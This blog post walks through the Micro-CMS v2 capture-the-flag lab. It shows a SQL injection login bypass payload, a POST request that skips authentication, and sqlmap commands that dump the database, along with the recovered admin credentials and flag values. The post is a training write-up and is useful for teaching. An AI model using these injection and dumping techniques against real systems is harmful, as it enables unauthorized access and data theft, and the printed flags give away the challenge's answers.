---
date: "2019-04-20"
title: "Micro-CMS v2"
category: "CTF"
---

CTF time !!
Let's find flags.

![alt text](https://media.giphy.com/media/sSmxfWnEVxtWU/giphy.gif)

### SQL Injection ~ 🚩(1/3)
Let's navigate to /login route (by clicking "Create a new page")
![alt text](https://storage.googleapis.com/warrenlee/myBlog/CTF/Micro-CMS%20v2/login.jpg)

By giving username ' (single quote), we got an error page
```
  Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
  ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1")
```

Focus on this line
```SQL
SELECT password FROM admins WHERE username=\'%s\'' ....
```

What if the username is -> 'UNION SELECT "AAA" AS password WHERE '1' = '1
<br/>
Then query will become
```SQL
SELECT password FROM admins WHERE username='' UNION SELECT "AAA" AS password WHERE '1' = '1'
```

This query fools the server to authorize any username with password = 'AAA'
<br />
After login, we got the first 🚩 from 'Private Page'
![alt text](https://storage.googleapis.com/warrenlee/myBlog/CTF/Micro-CMS%20v2/privatePage.jpg)


### Request Options ~ 🚩(2/3)
By making 'OPTIONS' request, we can get all available request methods.
<br />
Let's use httPIE
> http OPTIONS http://35.196.135.216:5001/5028781f57/page/edit/3

And we got
```
HTTP/1.1 200 OK
Allow: HEAD, GET, POST, OPTIONS
Connection: keep-alive
Content-Length: 0
Content-Type: text/html; charset=utf-8
Date: Sun, 21 Apr 2019 00:26:14 GMT
Server: nginx/1.14.0 (Ubuntu)
```
How about trying to make POST request to this API route ?
Then we got
```
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html; charset=utf-8
Date: Sun, 21 Apr 2019 00:27:49 GMT
Server: nginx/1.14.0 (Ubuntu)
Transfer-Encoding: chunked

^FLAG^0086ed8f02a35b35564b43376bf49a4de75465a274582411f48412a8f276f813$FLAG$
```

### Exploit Database ~ 🚩(3/3)
To exploit database, we might need to use sqlmap (http://sqlmap.org/)

Let's start with simple test
> sqlmap -u http://35.196.135.216:5001/bfcaf3cbda/login --data "username=a&password=b"

And we got 
```
...
[22:03:47] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.14.0
back-end DBMS: MySQL >= 5.0
[22:03:47] [INFO] fetching database names
[22:03:47] [INFO] used SQL query returns 4 entries
[22:03:48] [INFO] retrieved: 'information_schema'
[22:03:48] [INFO] retrieved: 'level2'
[22:03:48] [INFO] retrieved: 'mysql'
[22:03:48] [INFO] retrieved: 'performance_schema'
available databases [4]:
[*] information_schema
[*] level2
[*] mysql
[*] performance_schema
```

Nice !!
It seems like database 'level2' is what we are looking for.
And 'username' is exploitable var.
Try the command to dump all data.
> sqlmap -u http://35.196.135.216:5001/bfcaf3cbda/login --data "username=a&password=b" -p username --dump

The result was
```
Database: level2
Table: admins
[1 entry]
+----+----------+----------+
| id | username | password |
+----+----------+----------+
| 1  | adella   | britteny |
+----+----------+----------+

Database: level2
Table: pages
[3 entries]
+----+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+
| id | body                                                                                                                                                                                                                                                                                                                           | title               | public |
+----+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+
| 1  | ## Version 2\\nThis version fixed the multitude of security flaws and general functionality bugs that plagued v1.  Additionally, we added user authentication; we're still not sure why we didn't think about that the first time, but hindsight is 20/20.  By default, users need to be an admin to add or edit pages now.\\n | Micro-CMS Changelog | 1      |
| 2  | Just testing some markdown functionality.\\n\\n![adorable kitten](https://static1.squarespace.com/static/54e8ba93e4b07c3f655b452e/t/56c2a04520c64707756f4267/1493764650017/)\\n\\n<button>Some button</button>                                                                                                                 | Markdown Test       | 1      |
| 3  | My secret is ^FLAG^b757c5b12ab66a482b0cbd036bd9cc3c36c7c3ee4c99020c8fb61aa787e04541$FLAG$                                                                                                                                                                                                                                      | Private Page        | 0      |
+----+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+
```

Hmm ~~~ how about logging the (username, password) = ('adella', 'britteny')

Then we got flag :)

